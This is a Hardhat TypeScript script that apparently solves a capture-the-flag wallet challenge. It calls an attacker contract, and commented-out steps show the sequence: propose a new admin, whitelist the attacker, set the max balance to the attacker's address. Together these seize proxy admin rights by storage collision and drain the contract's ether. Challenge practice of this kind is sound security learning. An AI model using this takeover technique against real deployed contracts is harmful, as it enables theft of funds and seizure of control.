import { ethers, network } from "hardhat";
import {
  PuzzleProxy,
  PuzzleWallet,
  PuzzleWalletAttacher,
} from "../typechain-types";

async function main() {
  let puzzleProxy: PuzzleProxy;
  let puzzleWallet: PuzzleWallet;
  const [attacker] = await ethers.getSigners();
  const chainId = network.config.chainId;
  const isLocalTest = chainId === 31337;

  const puzzleWalletAttacher: PuzzleWalletAttacher = await ethers.getContract(
    "PuzzleWalletAttacher"
  );

  if (isLocalTest) {
    puzzleProxy = await ethers.getContract("PuzzleProxy");
    puzzleWallet = await ethers.getContractAt(
      "PuzzleWallet",
      puzzleProxy.address
    );
  } else {
    puzzleProxy = await ethers.getContractAt(
      "PuzzleProxy",
      "0x49FaB078A36482ce912A29ca3e825d52cC0BA299"
    );
    puzzleWallet = await ethers.getContractAt(
      "PuzzleWallet",
      "0x49FaB078A36482ce912A29ca3e825d52cC0BA299"
    );
  }

  async function check() {
    const admin = await puzzleProxy.admin();
    const owner = await puzzleWallet.owner();

    console.log("admin", admin);
    console.log("owner", owner);
    // admin is the attacker
    console.log(`admin === attacker: ${admin === attacker.address}`);
  }

  await check();

  //   // 1 - call proposeNewAdmin now the owner has been exploited and the attacker is the owner
  //   const tx = await puzzleProxy
  //     .connect(attacker)
  //     .proposeNewAdmin(attacker.address);
  //   await tx.wait(isLocalTest ? 1 : 5);
  //   console.log("proposeNewAdmin tx:", tx.hash);

  //   // 2 - whitelist the attacker
  //   const txWT = await puzzleWallet
  //     .connect(attacker)
  //     .addToWhitelist(attacker.address);
  //   await txWT.wait(isLocalTest ? 1 : 5);
  //   console.log("addToWhitelist tx:", txWT.hash);

  //   // 3 - setMaxBalance to to value igual to the attacker wallet
  //   const attackerWalletBigNumber = ethers.BigNumber.from(attacker.address);
  //   const txSB = await puzzleWallet
  //     .connect(attacker)
  //     .setMaxBalance(attackerWalletBigNumber);
  //   await txSB.wait(isLocalTest ? 1 : 5);
  //   console.log("setMaxBalance tx:", txSB.hash);
  console.log("---------------------------------------------------------");

  const tx = await puzzleWalletAttacher.connect(attacker).attack({
    value: ethers.utils.parseEther("0.007"),
  });
  await tx.wait(isLocalTest ? 1 : 5);
  console.log("attack tx:", tx.hash);

  // check the wallet balance
  const balance = await ethers.provider.getBalance(puzzleProxy.address);

  console.log("balance", ethers.utils.formatEther(balance));

  console.log("---------------------------------------------------------");

  // check the new admin
  await check();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
